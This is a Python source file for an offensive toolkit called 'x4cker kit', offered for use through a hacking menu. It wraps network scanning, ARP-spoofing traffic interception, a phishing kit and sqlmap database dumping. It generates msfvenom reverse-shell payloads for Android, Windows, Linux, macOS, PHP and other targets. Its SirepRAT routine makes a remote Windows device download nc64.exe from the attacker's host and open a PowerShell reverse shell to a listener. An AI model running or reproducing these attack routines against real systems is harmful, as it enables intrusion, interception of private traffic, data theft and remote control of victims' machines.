#!/usr/bin/env python3
# By Eddie Zaltsman
# -*- coding: utf-8 -*-
# x4cker kit v1.2.2

import requests
from pwn import *
from termcolor import colored
import string
import blessed
import time
import errno
import random
import sys
import datetime
import os
import re
import fnmatch
import urllib.request
import subprocess
from time import sleep
from subprocess import Popen, PIPE
from logging import getLogger, ERROR

def x4menu():
    try:
        print('''\n
                         ''' + colored('[X4CKERTOOLKIT v1.1.5]', 'red', attrs=['bold']) + '''
            [1]   STEALTH SCANNER           [11]  CIPHERCHEF
            [2]   MSF AUTOMATED             [12]  MOSINT
            [3]   MITM SNIFFER              [13]  SHODAN
            [4]   ONE LINER                 [14]  TEMPMAIL
            [5]   HASH CHECKER              [15]  SCRY
            [6]   URL FUZZER                [16]  ADVPHISHING
            [7]   WINLOADS                  [17]  SHERLOCK
            [8]   SQLMAP                    [18]  COMMIX
            [9]   XSRFPROBE                 [19]  LSExploit
            [10]  SMB12                     [20]  EXIT\n\n\n\n''')
        select = input(colored('ROOT:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
        select = select.replace("\n", "")
        if select == '?' or select == 'help':
            x4menu()
        if select == '1' or select == 'scan':
            netscanmenu()
        elif select == '20' or select == 'exit':
            print("\n--- By Eddie Zaltsman,HackerU ---\n")
            exit()
        elif select == '2':
            msf()
        elif select == 'banner':
            print("\n\n\n")
            x4menu()
        elif select == '3':
            sslsniffer()
        elif select == 'phone':
            r = requests.get('https://sms24.me/countries/il').text
            r = re.findall(r'[1697]\d{1,2}.\d{2,3}.\d{3,3}',r)
            for i in r:
                if len(i) <= 9:
                    pass
                else:
                    print(i)
           # tester = subprocess.Popen(f"""xterm -geometry 100x24 -T 'PHONEFUCKER' -hold -e 'curl'""", shell=True)https://sms24.me/number-972552603210
        elif select == '4':
            venom()
        elif select == '5':
            hashbruter()
        elif select == '7':
            oneliner()
        elif select == '8':
            sqlmap()
        elif select == '6' or select == 'url':
            subd()
        elif select == '9':
            xsrf()
        elif select == '10':
            target = input("Type Target : ").replace("\n", "")
            os.system(f'python /root/x4c/x4ckertoolkit/smb12.py {target}')
            input(colored('\n[+] Press any key to continue...\n', 'red', attrs=['bold']))
            x4menu()
        elif select == '11':
            os.system('service apache2 start')
            tester = subprocess.Popen(f"""xterm -geometry 100x24 -T 'CHROME' -hold -e 'google-chrome --no-sandbox http://localhost/cychef.html'""", shell=True)
            print("\n", "")
            x4menu()
        elif select == '12':
            tester = subprocess.Popen("""xterm -geometry 100x24 -hold -e 'proxychains mosint'""", shell=True)
           # os.system(f'cd /root/x4c/x4ckertoolkit/mosint/ && python3 mosint.py')
            x4menu()
        elif select == '13':
            test = input("Input Search Term : ").replace("\n", "")
            try:
                if int(test[0:2]) <= 99:
                    testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SHODAN' -hold -e 'shodan host {test}'", shell=True)
                    x4menu()
            except ValueError:
                testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SHODAN' -hold -e 'shodan search --fields=info,port,ip_str,os {test}'", shell=True)
                x4menu()
        elif select == '14':
            testor = subprocess.Popen("xterm -geometry 100x24 -T 'TEMPOMAIL' -hold -e 'tempomail'", shell=True)
            x4menu()
        elif select == '15':
            target0r = input("Input Target : ").replace("\n", "")
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SCRYING' -hold -e 'scrying -t {target0r}'", shell=True)
            x4menu()
        elif select == '16':
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T AdvPhishing -hold -e 'cd /root/AdvPhishing/ && bash AdvPhishing.sh'", shell=True)
            x4menu()

        elif select == '17':
            mail = input("Type Username to Test: ").replace("\n", "")
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T Sherlock -hold -e 'cd /root/sherlock/sherlock && python3 sherlock.py {mail}'", shell=True)
            x4menu()
        elif select == '18':
            urli = input("Input URL(HTTPS/HTTP) : ").replace("\n", "")
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T COMMIX -hold -e 'proxychains -q commix -u {urli} --random-agent --level 3'",shell=True)
            x4menu()
        elif select == '19':
            code = input("PRNT.SC Code : ").replace("\n", "")
            testor = subprocess.Popen(f"xterm -geometry 24x14 -T MOTHERFUCKER -hold -e 'cd /root/x4c/x4ckertoolkit/motherfucker && python3 motherfucker.py --code {code}'", shell=True)
            x4menu()
        else:
            print("\nInvalid Input, Please Select from the Following Options.")
            sleep(0.1)
            x4menu()
    except KeyboardInterrupt:
        sleep(0.1)
        print("\n Script Made for PRV Use - Restarting\n")
        banner()
        x4menu()
def netscanmenu():
    select = input('\n[1]   X4 QUICK NETWORK TRACEROUTE\n[2]   X4 TARGET SCANNER\n[3]   BACK\n\n' + colored('ROOT:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
    select = select.replace("\n", "")
    if select == '2':
        print("\nWith Great Power Comes Great Responsibility.\n")
        targetscan()
    if select == '99':
        netdis()
    if select == '1':
        tracer()
    if select == '0' or select =='3':
        x4menu()
    if select != '0' or select != '1' or select != '2' or select != '3' or select != '4':
        print("Invalid Input - Going Back...")
        sleep(1)
        netscanmenu()
def targetscan():
    target = input("[X4] Please Enter Target: ")
    target.replace("\n", "")
    os.system(f'sudo nmap --open -p- -vv {target}')
    print("\nFINISHED!")
    portscaner = input("\n[X4] Deep Port Scan ? (y/n) : ")
    portscaner = portscaner.replace("\n", "")
    if portscaner == 'y' or portscaner == 'yes':
        portnum = input("[X4] Type Ports , (Ex: 21,22,445) : ")
        portnum = portnum.replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'nmap -sV -sC -p{portnum} -v {target}'])
        sleep(1)
        x4menu()
    else:
        x4menu()
    x4menu()
def sslsniffer():
    print("\nAvailable Devices: \n")
    os.system("ifconfig | grep 'eth\|tun'")
    inttt = input("\n[X4]  Choose Your Interface : ")
    up_interface = str(inttt)
    up_interface = up_interface.replace("\n", "")
    print("\n")
    os.system(f"route -n | grep {up_interface}")
    gateway = input("\n[X4]  Enter Your Default Gateway : ").replace("\n", "")
    target_ips = input("[X4] Enter Target IP Address : ").replace("\n", "")
    print(f"[++] All logs are saved on : /opt/x4ckerkit/x4ckersniff")
    print(f"[++] Sniffing on {target_ips}")
    print("\n[++] Press 'Ctrl + C'  Once In This Window to stop . \n")
    xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'arpspoof' -hold -e 'arpspoof -i {up_interface} -c both -t {target_ips} -r {gateway}'""", shell=True)

    xterm2 = subprocess.Popen(['xterm', '-hold', '-e', f'wireshark -i {up_interface} -Y "ip.src == {target_ips} or ip.dst == {target_ips}" -k'])

    xterm2.communicate()

    x4menu()
def tracer():
    print("[++] Sudo Rights are Needed for this Scan [++]")
    trgt = input("[X4] Type Range to Scan (Ex: 10.0.0.0/24) : ")
    os.system(f'sudo nmap -sn --traceroute {trgt}')
    sleep(0.5)
    netscanmenu()
def hashbruter():
    hashed = input("Type HASH: ")
    os.system(f'hash-identifier {hashed}')
    input("\nPress any Key to continue...\n")
    x4menu()
def msf():
    payload = input('''[1] APK
[2] ASP
[3] ASPX
[4] Bash[.sh]
[5] Java[.jsp]
[6] Linux[.elf]
[7] OSX[.macho]
[8] Perl[.pl]
[9] PHP
[10] Powershell[.ps1]
[11] Python[.py]
[12] Tomcat[.war]
[13] Windows[.exe //.exe //.dll]
[14] Pure Shellcode
[15] BACK\n\n''' + colored('ROOT:PAYLOADS:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
    badchars = b'\x00\x01\x02\x80\xFF\xFC\x0F\x14'
    payload = payload.replace("\n", "")
    if payload == '1':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp {lhost} lport=4444 > android_shell.apk")
        print("File Written - android_shell.apk\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '2':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f asp > shell.asp")
        print("File Written - shell.asp\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '3':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars}-f asp > shell.aspx")
        print("File Written - shell.aspx\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '4':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.sh")
        print("File Written - shell.sh\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '5':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars}-f raw > shell.jsp")
        print("File Written - shell.jsp\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '6':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f elf > shell.elf")
        print("File Written - shell.elf\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '7':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f macho > shell.macho")
        print("File Written - shell.macho\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '8':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p cmd/unix/reverse_perl LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.pl")
        print("File Written - shell.pl\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '9':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT=4444 -b -f php > shell.php")
        print("File Written - shell.php\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '10':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f psh > shell.ps1")
        print("File Written - shell.ps1\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '11':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.py")
        print("File Written - shell.py\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '12':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT=4444 -b -f war > shell.war")
        print("File Written - shell.war\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '13':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f exe > shell.exe")
        print("File Written - shell.exe\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '14':
        lhost = input("input LHOST: ").replace("\n", "")
        lport = input("Input LPORT: ").replace("\n", "")
        format = input("Input Format: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp lhost={lhost} lport={lport} -f {format} -b {badchars}")
        print("\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '15':
        x4menu()
def sireprat():
    choice = input("Send or Activate[S,A,E]? ")
    choice = choice.replace("\n", "")
    if choice == 'S':
        rhost = input("Input RHOST: ").replace("\n", "")
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f'python /root/SirepRAT/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args "/c powershell Invoke-Webrequest --OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://{lhost}:80/nc64.exe" --v')

    if choice == 'A':
        print("[X] --- Starting Listener Port 4444 --- [X]\n")
        rhost = input("Input RHOST: ").replace("\n", "")
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f'python /root/SirepRAT/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe {lhost} 4444 --e powershell.exe" --v')
        listener = listen(4444)
        try:
            if listener.wait_for_connection().settimeout(timeout=18):
                listener.interactive()
                listener.close()
            else:
                listener.close()
                print("Exploit failed.")
                x4menu()
        except AttributeError:
            listener.close()
            print("Exploit Failed")
            x4menu()
        except OSError:
            print(OSError)
            print("Port Already Binded")
            x4menu()
    if choice == "E":
        x4menu()
    else:
        print("Wrong Input")
        sireprat()
def sqlmap():
    select = input("Request or URL ? (r,u)\n" + colored('ROOT:', 'red', attrs=['bold']) + colored('SQLMAP > ', 'white')).replace("\n","")
    if select == "r" or select == "req" or select == "request":
        url = input("Input BURP Post Requset File : ").replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'sqlmap -r {url} --level=2 --risk=2 --random-agent --dump'])
        sleep(1)
        x4menu()
    elif select == "u" or select == "url":
        url = input("Input URL: ").replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'sqlmap -u {url} --level=2 --risk=2 --random-agent --forms --crawl 2 --dump'])
        sleep(1)
        x4menu()
    else:
        print("Invalid Option")
        sqlmap()
def xsrf():
    url = input("Input URL : ")
    url = url.replace("\n", "")
    xterm = subprocess.Popen(['xterm', '-hold', '-e', f'xsrfprobe -u {url}'])
    sleep(1)
    x4menu()
def banner():
    print("""
                        ██╗  ██╗██╗  ██╗ ██████╗
                        ╚██╗██╔╝██║  ██║██╔════╝
                         ╚███╔╝ ███████║██║     
                         ██╔██╗ ╚════██║██║     
                        ██╔╝ ██╗     ██║╚██████╗
                        ╚═╝  ╚═╝     ╚═╝ ╚═════╝
                            PRV Framework
                          Type "?" for Menu.       
                          
                          
                          
                          
                                      
""")
def venom():
    os.system('python3 /root/x4c/OneLinerX4/OneLiner.py')
    sleep(1)
    x4menu()
def subd():
    print("[X] --- Input FUZZ in the chosen place. --- [X]\n")
    print("[X] --- Exmaple: https://FUZZ.jjisrael.com ---- [X]\n")
    url = input("Input URL: ").replace("\n", "")
    url = url.replace("\n", "")
    if "FUZZ" in url:
        if url[-4:] == "FUZZ":
            xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -c -w /usr/share/dirb/wordlists/common.txt -u {url} -fc 404,429 -recursion -recursion-depth 3 -H "User-Agent: Im4Ph0n3_Bu7n07r34lly"'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""", shell=True)
            sleep(1)
            x4menu()
        else:
            xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -c -w /usr/share/dirb/wordlists/common.txt -u {url} -fc 404,429 -H "User-Agent: Im4Ph0n3_Bu7n07r34lly"'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""", shell=True)
            sleep(1)
            x4menu()
    else:
        print("\n[X] Please Type FUZZ in the Desired Location [X]\n")
        sleep(1)
        subd()
def oneliner():
    xterm = subprocess.Popen(['xterm', '-hold', '-e', f'cd /root/x4c/Winpayloads/ && python WinPayloads.py'])
    sleep(1)
    x4menu()


if __name__ == '__main__':
    getLogger("scapy.runtime").setLevel(ERROR)
    try:
        x4menu()
    except KeyboardInterrupt:
        sleep(1)
        print("\n Script Made for PRV Use - Restarting\n")
        banner()
        x4menu()
